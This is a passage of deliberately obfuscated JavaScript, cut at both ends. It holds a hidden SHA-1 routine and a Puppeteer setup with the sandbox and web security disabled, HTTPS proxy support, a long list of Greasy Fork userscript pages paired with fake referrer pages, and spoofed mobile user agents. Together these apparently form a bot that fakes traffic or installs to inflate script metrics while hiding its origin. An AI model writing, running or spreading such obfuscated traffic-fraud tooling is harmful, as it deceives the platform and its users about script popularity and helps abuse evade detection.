0x627) << -0x5ad * 0x5 + 0xe8b + 0xddb | x >>> -0x1a58 + -0x2ba + 0x4d * 0x61) + (y & (z = z << 0x5 * 0x3d1 + 0x261b + -0x3912 | z >>> -0x97b + 0x200d + 0x13 * -0x130) | y & A | z & A) + w - (0xd686abdd + -0x7f0 * -0x14f47d + -0x10bf708e9) + B[u + (0x838 + 0xd26 + -0x1 * 0x155a)] << 0xa4 * 0x29 + 0x1237 * 0x1 + -0x2c7b, y = y << 0xc7 * -0x3 + 0x1ead + 0x1c3a * -0x1 | y >>> -0x49 * -0x32 + -0x1 * -0x223 + -0x1063;
          for (; u < -0xed * -0x1a + 0x1 * -0x17ff + -0x3d * -0x1; u += -0x16cc + 0x11 * -0xad + 0x2 * 0x1127)
            w = (v = (x = (v = (y = (v = (z = (v = (A = (v = w << 0x919 * 0x1 + 0xb8c + -0x10 * 0x14a | w >>> 0x95 * 0xd + 0x1d86 + 0x4 * -0x93f) + (x ^ y ^ z) + A - (-0x2d04bef * 0x1c + -0x43814e9 + 0x35 * 0x293e13b) + B[u] << -0x200 + -0x282 * -0x1 + -0x2 * 0x41) << 0xaf * 0xe + -0x1 * -0x23bd + -0x2d4a | A >>> -0x1 * 0x20b5 + 0x14df + 0xbf1 * 0x1) + (w ^ (x = x << 0x20cf * -0x1 + 0xbb8 + 0x3d * 0x59 | x >>> -0x95 * -0x34 + 0xcfb + -0x1 * 0x2b3d) ^ y) + z - (0x7ce4b96 + 0x192d * 0x22f03 + -0x1 * 0x92a9bf3) + B[u + (0xa6f + 0x21f9 + -0x2c67)] << -0x1be4 + 0x127b + -0x969 * -0x1) << -0xfeb + -0x1 * 0x13ae + -0x2f * -0xc2 | z >>> 0x39b + 0x2d1 + -0x651) + (A ^ (w = w << 0x14e6 + 0x12d0 + 0x16a * -0x1c | w >>> -0x7c * 0x3b + 0x1 * 0x254b + -0x3 * 0x2e7) ^ x) + y - (-0x7f23 * 0x67d3 + -0x7705f7 * -0x86 + 0x2adffdb9 * 0x1) + B[u + (0xe28 + -0x224e + 0x1428)] << -0x2493 + -0x200 + 0x2693) << -0x1735 + -0x270b + -0x3e45 * -0x1 | y >>> 0xa2f + 0x80 * -0x3e + 0x14ec) + (z ^ (A = A << 0x1 * -0x1dcd + 0x5ab * -0x6 + 0x443 * 0xf | A >>> -0x5d8 + 0x1b5c + -0x1582) ^ w) + x - (0x19d * -0x360564 + -0x422f8304 + 0x6779b9c1 * 0x2) + B[u + (0x1025 + 0x23d5 + -0x33f7)] << 0x1 * 0x3 + 0x2 * -0x3ec + -0x5 * -0x191) << -0xe1c + -0xfeb * -0x1 + -0x1ca | x >>> 0x5 * 0x253 + 0x16da + -0x225e * 0x1) + (y ^ (z = z << 0x1 * -0x971 + -0x2037 + -0x2 * -0x14e3 | z >>> 0x2581 + -0x317 + -0x2268) ^ A) + w - (0x58 * 0x10a2e91 + -0x13c5e9 * -0x3bb + -0x6fa60fe1) + B[u + (-0x1a8 * 0xd + 0x23fd + -0x1 * 0xe71)] << 0x1211 + -0x5dd + -0xc34, y = y << 0x350 + -0x26fd + 0x23cb | y >>> -0x19f4 + 0x13 * 0x3d + 0x1f * 0xb1;
          this['h0'] = this['h0'] + w << -0x2408 + -0x15ee + 0x39f6, this['h1'] = this['h1'] + x << -0x1e + 0x37 + -0x19 * 0x1, this['h2'] = this['h2'] + y << -0xcd * 0xe + -0x1 * 0x1206 + 0x1d3c, this['h3'] = this['h3'] + z << 0x471 * -0x3 + -0x1 * 0x99d + 0x8 * 0x2de, this['h4'] = this['h4'] + A << 0xd64 + 0x39 * 0x6c + -0x2570;
        }
        ['hex']() {
          this['finalize']();
          var u = this['h0'],
            v = this['h1'],
            w = this['h2'],
            x = this['h3'],
            y = this['h4'];
          return f[u >> 0x6ea + -0x262 + -0x46c & 0x2 * -0xa21 + 0x10 * 0x11b + 0x2a1] + f[u >> 0x6cd * -0x2 + 0x1d * 0x61 + 0x2b5 & 0x9f0 + -0xb1b * 0x1 + 0x13a] + f[u >> 0x1746 + -0x1ba1 + 0x46f & -0x1aa * 0xb + -0xb9 * 0x28 + 0x2f45] + f[u >> -0x71e * 0x5 + 0xd29 + 0x39 * 0x65 & 0x2 * -0xf65 + -0x6b * -0x43 + 0x2d8 * 0x1] + f[u >> 0x2 * -0xb + 0x1fcd + -0x79 * 0x43 & -0x5 * -0xe8 + 0x139a + 0x1813 * -0x1] + f[u >> 0x5ee + -0x2d5 * 0x4 + 0x56e & -0x5 * 0x2a7 + -0x37 * 0x53 + 0x1f27] + f[u >> 0x9 * 0x1a7 + -0x1921 + 0xa46 & -0x1f * -0x1 + 0x3 * -0xcc3 + -0x5 * -0x7a5] + f[0x185 + 0x1bb6 + -0x1 * 0x1d2c & u] + f[v >> -0x9a8 + -0x15c6 + 0x1f8a & 0x97e + -0xf * -0x86 + -0x4b * 0x3b] + f[v >> -0x4e9 + 0x6 * 0x309 + -0x7 * 0x1e3 & 0x31 * 0x79 + 0x665 + 0x347 * -0x9] + f[v >> -0xe3 * 0x6 + -0x1 * 0x1215 + 0x177b & 0x1 * 0x13f1 + -0xb * 0x1a3 + 0xd * -0x25] + f[v >> -0x727 * 0x1 + 0x1c9 * -0x2 + -0xfb * -0xb & -0x185a * 0x1 + -0xbd * -0x2c + 0x35 * -0x27] + f[v >> -0x1599 + 0x2527 * -0x1 + 0x3acc & -0x25 * -0x53 + -0x2514 + -0x4 * -0x649] + f[v >> 0x25 * 0x91 + 0x1363 * -0x2 + 0x11d9 & -0x4f5 + 0x4b8 + -0x4c * -0x1] + f[v >> 0x22cb + -0xb04 + -0x17c3 & 0x619 * 0x6 + -0x1 * 0xef5 + -0x1592] + f[-0x187d + 0x13d0 + -0xca * -0x6 & v] + f[w >> 0x2 * 0xcf0 + -0x25 * -0xc0 + -0x3584 & 0x81c + 0x146c + -0x1c79] + f[w >> -0x1a * -0x25 + 0x22a * -0x6 + 0x952 & 0x1608 + 0x1 * -0x1ece + -0x143 * -0x7] + f[w >> -0x5 * -0x37d + -0x1282 + 0x125 & 0x1 * -0x364 + 0x4 * -0x387 + 0x118f] + f[w >> 0x25fd + -0x79 * 0x49 + -0x36c & -0x1 * 0x26 + 0x524 + -0x4ef] + f[w >> 0x3 * -0xbc2 + 0x41 * -0x23 + 0x1 * 0x2c35 & -0x22f5 + 0x47c + 0x1e88] + f[w >> -0x1d9 * -0x9 + 0x1 * 0x18ed + -0x2986 & -0x79f + 0x807 * 0x4 + -0xc37 * 0x2] + f[w >> 0xa3d * 0x3 + 0x1f5d + -0x30 * 0x14b & -0xa20 + -0x1 * 0xf62 + 0x51d * 0x5] + f[0x3 * 0x5e3 + -0x97 + -0x1103 & w] + f[x >> 0x1 * 0xaa3 + 0x17e0 + 0x1 * -0x2267 & 0x5a5 + -0xc88 + 0x6f2] + f[x >> 0x5 * -0x536 + 0x1 * -0x13c + -0xa * -0x2bd & -0x1fe5 + -0x149d * -0x1 + 0xb57] + f[x >> 0x96 + 0x749 + -0x7cb & -0x3 * -0x1a3 + 0x2462 + 0xe * -0x2f2] + f[x >> 0x35 * -0x1 + -0x14bc * -0x1 + -0x1477 & 0xd * -0x18d + 0x9 * -0x24d + 0x28ed] + f[x >> -0x1 * -0x6e7 + -0x1b23 * 0x1 + -0x3b * -0x58 & 0x17ac + -0x9a1 * -0x1 + -0x213e] + f[x >> 0x1a52 + -0x88c * 0x3 + -0xa6 & -0xf64 + -0x1d0 * 0xb + 0x1 * 0x2363] + f[x >> 0xcaa + 0x3 * -0x573 + 0x3b3 & 0x10e + -0x41f * -0x7 + -0x2fc * 0xa] + f[0x1977 + 0x2b9 + 0x1c21 * -0x1 & x] + f[y >> 0x890 + -0x1d6f + 0x14fb & 0x2b * 0x9f + 0x5 * 0x2a7 + -0x27e9] + f[y >> -0x1 * 0xb06 + 0x167 + 0x3 * 0x33d & -0x25a9 + 0x4 * 0xc8 + 0x1b * 0x148] + f[y >> 0x1 * -0x2665 + -0x157d * -0x1 + 0x10fc * 0x1 & -0x203f + -0x260d + 0x465b] + f[y >> 0x1356 + -0x8 * 0x8f + -0xece & -0x2 * -0x10c7 + -0x647 + 0x1 * -0x1b38] + f[y >> -0x1b8d * -0x1 + -0x14ce + 0x6b3 * -0x1 & 0x1 * -0x237f + -0x27 * 0x61 + 0x3 * 0x10c7] + f[y >> -0x1739 + -0x11f0 + 0x5 * 0x83d & 0x1 * -0x538 + 0xc1 * 0x9 + -0x182] + f[y >> -0x1fda + -0x14a8 + 0x3486 & 0x263d + -0x35f * 0x3 + -0x1 * 0x1c11] + f[0x1 * 0x117e + 0x1e1d * 0x1 + -0x1 * 0x2f8c & y];
        }
        ['digest']() {
          this['finalize']();
          var u = this['h0'],
            v = this['h1'],
            w = this['h2'],
            x = this['h3'],
            y = this['h4'];
          return [
            u >> 0x644 * -0x4 + -0x86 + 0x19ae & 0xf72 + -0x4 * -0x99b + -0x34df,
            u >> -0x16b9 + -0x1767 + 0x2e30 & 0xd36 * 0x2 + -0x1311 * -0x1 + -0x2c7e,
            u >> -0xc61 * 0x1 + -0x2 * -0x83d + -0x1 * 0x411 & -0x105 * -0x16 + -0x16d3 + 0x164, -0xe28 + 0x21dd + -0x12b6 & u,
            v >> -0x1 * 0x21c1 + -0x13b4 + 0x1 * 0x358d & -0xb * -0xa9 + -0xdc0 + 0x77c,
            v >> -0xb4b + -0x77 * 0xd + 0x1166 & -0xb72 * -0x3 + -0x17d5 * 0x1 + -0x982,
            v >> -0x1a47 + -0x67 * -0x5 + 0x184c & 0x162b + -0x68 + 0x14c4 * -0x1, -0x240 + -0xa65 * -0x2 + -0x118b & v,
            w >> 0x1dc6 + -0x1b25 + -0x289 & -0x1bea + -0x8cb + 0x25b4,
            w >> -0x1ca * 0x12 + -0xade + -0x1 * -0x2b22 & 0x2 * 0xd5e + -0x1a2f * -0x1 + 0x1 * -0x33ec,
            w >> -0x1 * 0x162a + 0x1 * -0x835 + -0x2b * -0xb5 & -0xb28 + -0x19e + 0xdc5,
            0x165c + -0x3 * -0x5e8 + -0xd07 * 0x3 & w,
            x >> -0x24ed + 0xb1f * 0x3 + 0x3a8 * 0x1 & 0x2649 + -0x1d * 0x123 + 0x1 * -0x453,
            x >> -0x265 * -0x9 + -0x3bb + -0x11c2 & 0x3b * 0x6d + 0x35 * -0x35 + -0xd27,
            x >> 0x1d8e + -0x18bf * -0x1 + -0x3 * 0x1217 & -0xbdf + 0xb65 + 0x179, -0x141d + -0x35b * 0x1 + 0x1 * 0x1877 & x,
            y >> -0x142b + -0x16db + 0x2b1e & 0x2 * 0x4e8 + -0x1 * 0x96d + 0x9c,
            y >> 0x26dd + 0x919 + -0x2fe6 * 0x1 & 0x7 * 0x33e + 0x20ee + -0x36a1,
            y >> 0x5 * 0x3e + -0x254 + 0x126 & 0x1049 * 0x1 + -0x14f7 + 0x1 * 0x5ad, -0x18cf + 0x95 * 0x3 + -0x805 * -0x3 & y
          ];
        }
        ['arrayBuffe' + 'r']() {
          var r, s;
          return this['finalize'](), r = new ArrayBuffer(0x1 * -0xa61 + -0x11 * 0x3b + 0xe60), (s = new DataView(r))['setUint32'](0x10d9 + -0x13e5 + 0x1 * 0x30c, this['h0']), s['setUint32'](0x3d7 * 0x1 + 0x3 * -0x7cc + 0x1 * 0x1391, this['h1']), s['setUint32'](-0x1b27 * 0x1 + -0x1bc1 + 0x36f0, this['h2']), s['setUint32'](0x4 * -0x1c + 0x2 * -0x55f + 0x3be * 0x3, this['h3']), s['setUint32'](-0x4 * -0x1bf + 0x2b9 + -0x9a5, this['h4']), r;
        }
    }
    p['prototype']['toString'] = p['prototype']['hex'], p['prototype']['array'] = p['prototype']['digest'];
    const q = l();
    return q;
  })()),
  wait = f => new Promise(g => setTimeout(g, f)),
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil,
    min: min
  } = Math,
  NETWORK_PATIENCE = 0x3b57 + -0x2ddc + -0x67 * -0x53 + (0xa7c + -0x168e + -0x366 * -0x7) * random(),
  MM_NETWORK_PATIENCE = (0x20e2 + 0x11 * 0x219 + -0x5b6 * 0xc) * NETWORK_PATIENCE,
  me = random()['toString'](0x1f7 * -0xc + 0x405 + 0x139f * 0x1)['substring'](-0x1a09 + 0x1 + -0x1a0c * -0x1, 0x1 * 0x20cc + -0x64d * -0x3 + -0x33a9),
  pptOptions = {
    'headless': 0x0,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ],
    'executablePath': '/../../../' + process['env']['PUPPETEER_' + 'EXECUTABLE' + '_PATH']
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  {
    HttpsProxyAgent: HttpsProxyAgent
  } = require('https-prox' + 'y-agent'),
  data = {
    'scriptTargets': [{
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + ax(0x9) + 'nti-afk-ti' + 'meout',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + ax(0x8) + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + ax(0x23) + 'ble',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + ay(0x21) + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + az(0xe, 'BZ33')
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': ay(0x18) + ax(0x5) + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + az(0x16, 'lvj!') + 're',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
        'preRef': 'https://gr' + 'easyfork.o' + ay(0x11) + 'pts/by-sit' + 'e/taming.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + az(0x25, 'xI5!') + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
      }
    ],
    'userAgents': [
      'Mozilla/5.' + ay(0x22) + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
